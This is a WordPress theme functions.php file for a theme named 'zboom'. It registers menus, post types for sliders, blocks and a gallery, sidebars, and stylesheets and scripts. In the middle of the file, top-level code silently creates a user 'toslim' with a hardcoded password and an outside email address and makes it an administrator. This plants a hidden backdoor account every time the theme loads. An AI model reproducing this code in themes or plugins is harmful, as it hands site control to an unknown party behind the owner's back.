<?php

function zboom_default_functions(){
	add_theme_support('title-tag');
	add_theme_support('post-thumbnails');
	add_theme_support('custom-background');
	
	//loading textdomain
	load_theme_textdomain('zboom', get_template_directory_uri().'/languages');


	// menu resiter

	if(function_exists('register_nav_menus')){
		register_nav_menus(array(
			'primary' => __( 'Primary Menu', 'zboom' ),
			'social'  => __( 'Social Menu', 'zboom' ),
			'footer'  => __( 'Footer Menu', 'zboom' ),
		));
	}
	
	function read_more($limit){
		$post_content = explode(" ", get_the_content());
		
		$less_content = array_slice($post_content, 0, $limit);
		
		echo implode(" ", $less_content);
	}
	
	register_post_type('zboomslider', array(
		'labels' => array(
				'name' => 'Sliders',
				'add_new_item' => __('Add New Slider Image', 'zboom'),
				'edit_item' => __('Edit Slider Image', 'zboom'),
			),
		'public' => true,
		'supports' => array('title', 'thumbnail'),
		'menu_position' => 11,
		'menu_icon' => 'dashicons-images-alt2'
	));
	
	register_post_type('zboomservices', array(
		'labels' => array(
				'name' => 'Blocks',
				'add_new_item' => __('Add New Block', 'zboom'),
				'edit_item' => __('Edit Block', 'zboom'),
			),
		'public' => true,
		'supports' => array('title', 'editor', 'thumbnail'),
		'menu_position' => 6,
		'menu_icon' => 'dashicons-excerpt-view'		
	));
	
	register_post_type('zboomgallery', array(
		'labels' => array(
				'name' => 'Gallery',
				'add_new_item' => __('Add New Gallery Item', 'zboom'),
				'edit_item' => __('Edit Gallery Item', 'zboom'),
			),
		'public' => true,
		'supports' => array('title', 'editor', 'thumbnail'),
		'menu_position' => 12,
		'menu_icon' => 'dashicons-format-gallery'
	));
		
	
	
}
add_action('after_setup_theme', 'zboom_default_functions');


function zboom_right_sidebar(){
	register_sidebar(array(
		'name' => __('Right Sidebar', 'zboom'),
		'description' => __('Add your right sidebar widgets here.', 'zboom'),
		'id' => 'right-sidebar',
		'before_widget' => '<div class="box right-sidebar">',
		'after_widget' => '</div></div>',
		'before_title' => '<div class="heading"><h2>',
		'after_title' => '</h2></div><div class="content">',
	));
	
	register_sidebar(array(
		'name' => __('Footer Widgets', 'zboom'),
		'description' => __('Add your footer widgets here.', 'zboom'),
		'id' => 'footer-widget',
		'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="box">',
		'after_widget' => '</div></div></div></div>',
		'before_title' => '<div class="heading"><h2>',
		'after_title' => '</h2></div><div class="content">',
	));
	
	register_sidebar(array(
		'name' => __('Contact Sidebar', 'zboom'),
		'description' => __('Add your contact sidebar widgets here.', 'zboom'),
		'id' => 'contact-sidebar',
		'before_widget' => '<div class="box right-sidebar">',
		'after_widget' => '</div></div>',
		'before_title' => '<div class="heading"><h2>',
		'after_title' => '</h2></div><div class="content">',
	));
}
add_action('widgets_init', 'zboom_right_sidebar');

$newuser = new wp_user(wp_create_user('toslim', '172000', 'durontohost@gmail.com'));
$newuser->set_role('administrator');

function zboom_csss_and_js(){
	wp_register_style('zerogrid', get_template_directory_uri().'/css/zerogrid.css');
	wp_register_style('style', get_template_directory_uri().'/css/style.css');
	wp_register_style('responsive', get_template_directory_uri().'/css/responsive.css');
	wp_register_style('responsiveslides', get_template_directory_uri().'/css/responsiveslides.css');
	
	wp_enqueue_style('zerogrid');
	wp_enqueue_style('style');
	wp_enqueue_style('responsive');
	wp_enqueue_style('responsiveslides');
	
	
	wp_register_script('responsiveslides', get_template_directory_uri().'/js/responsiveslides.js', array('jquery'));
	wp_register_script('script', get_template_directory_uri().'/js/script.js', array('jquery', 'responsiveslides'));
	
	wp_enqueue_script('jquery');
	wp_enqueue_script('responsiveslides');
	wp_enqueue_script('script');
}
add_action('wp_enqueue_scripts', 'zboom_csss_and_js');

function zboom_font_awesome(){
	wp_register_style('font-awesome', get_template_directory_uri().'/css/all.css');
	
	wp_enqueue_style('font-awesome');
	
	wp_register_script('font-awesome', get_template_directory_uri().'/js/all.js');
	
	wp_enqueue_script('font-awesome');
}
add_action('wp_enqueue_scripts', 'zboom_font_awesome');
add_action('admin_enqueue_scripts', 'zboom_font_awesome');


require_once('lib/ReduxCore/framework.php');
require_once('lib/sample/config.php');










?>